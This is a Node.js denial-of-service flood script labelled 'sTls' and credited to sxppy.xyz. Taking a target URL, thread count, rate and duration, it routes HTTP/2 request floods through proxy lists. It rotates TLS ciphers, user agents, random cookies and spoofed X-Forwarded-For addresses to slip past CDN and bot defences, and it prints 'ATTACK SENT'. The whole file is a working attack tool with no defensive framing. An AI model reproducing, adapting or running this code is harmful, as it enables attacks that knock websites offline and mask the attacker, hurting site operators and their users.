//
//BY SXPPY.XYZ

process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});

require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const execSync = require('child_process').execSync;
const fs = require('fs');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');

try {
  var randstr = require('randomstring');
  var {
    constants
  } = require('crypto');
  var tls = require('tls');
  var url = require('url');
} catch {
  console.log('Installing govno...');
  execSync('npm install crypto randomstring tls url');
  process.exit();
};

var Gen_Secdest = [
    'document',
    'empty',
    'object',
    'iframe',
    'frame'
];

UAs = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0',
  'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
  'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
  'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11',
  'Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1',
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
  "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
  "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
  "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
  "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
  "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)"
];
const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':');
this.sigalgs = SignalsList;

var accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
control_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'maxage=604800',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
],

encode_header = [
  "gzip, deflate",
  "gzip, deflate, br",
  "deflate, gzip;q=1.0, *;q=0.5",
  "*"
],

lang_header = [
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-US,en;q=0.5',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'da, en-gb;q=0.8, en;q=0.7',
  'cs;q=0.5'
],

method = [
    "GET",
    "HEAD",
    "POST",
    "PRI",
    "BASELINE-CONTROL",
    "ACL",
    "BIND",
    "CONNECT",
    "DELETE",
    "OPTIONS",
    "PUT",
    "TRACE",
    "MERGE"
];

function makeid(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result += characters.charAt(Math.floor(Math.random() * 
charactersLength));
 }
 return result;
}

function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function enh() {
  return encode_header[Math.floor(Math.random() * encode_header.length)];
}
function gensec() {
    return Gen_Secdest[Math.floor(Math.random() * Gen_Secdest.length)];
}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function controling() {
    return control_header[Math.floor(Math.random() * control_header.length)];
}

function meth() {
    return method[Math.floor(Math.random() * method.length)];
}

try {
  var proxies = fs.readFileSync('proxyy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
  var uas = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
  if (err.code !== 'ENOENT') throw err;
  console.log('Proxy list / UA List not found. [proxy.txt] [ua.txt]');
  process.exit();
};

tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

if (process.argv.length < 6) {
  console.log('sTls / by https://sxppy.xyz / V 1.0');
  console.log('./sTls <target> <threads> <rate> <mode> <time>');
  process.exit(0);
}

let COOKIES = undefined;
let POSTDATA = undefined;

const cplist = [
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
];

const rIp = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

var parsed = url.parse(process.argv[2]);

let headerbuilders = {
  "Cache-Control": controling(),
  'upgrade-insecure-requests': 1,
  ":method": meth(),
  ":path": parsed.path,
  'Accept': accept(),
  'Accept-Encoding': enh(),
  'Accept-Language': lang(),
  "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
  "sec-ch-ua-mobile": '?0',
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": gensec(),
  "sec-fetch-site": 'cross-site',
  "sec-fetch-mode": 'navigate',
  "sec-fetch-user": '?1',
  "TE": 'trailers',
  "Pragma": 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace'
};

if (cluster.isMaster) {

  for (let i = 0; i < process.argv[3]; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(1);
  }, process.argv[5] * 1000);

} else {
  startflood();
};

const agent = new http.Agent({
  keepAlive: true, // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

function startflood() {
  console.log("\x1b[31mATTACK SENT | HTTPS-MIX [BOOM SAPUL!]-> ", process.argv[2])
  setInterval(() => {

    var cipper = cplist[Math.floor(Math.random() * cplist.length)];
    var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    let randomstr = makeid(25)
    var req = http.request({ //set proxy session
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, (err) => {
      req.end();
      return;
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {

      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cipper,
          honorCipherOrder: true,
          secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
          servername: parsed.host,
          curve: "GREASE:X25519:x25519",
          rejectUnauthorized: false,
          requestCert: true,
          secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1, 
          secure: true,
          ALPNProtocols: ['h2'],
          sessionTimeout: 5000,
          socket: socket
        }, function() {

          for (let i = 0; i < process.argv[4]; i++) {
            headerbuilders[":authority"] = parsed.host,
            headerbuilders["Cookie"] = randomstr,
            headerbuilders["user-agent"] = uas[Math.floor(Math.random() * uas.length)];
            headerbuilders["X-Forwarded-For"] = rIp();
            headerbuilders["Referer"] = process.argv[2] + '?' + randstr.generate({
              length: 10,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            });
            headerbuilders["Origin"] = 'http://' + randstr.generate({
              length: 8,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            }) + '.com'

            const req = client.request(headerbuilders);
            req.end();
            req.on("response", () => {
              req.close();
            })
          };

        })
      });
    }).end();

    req.end();

  });

};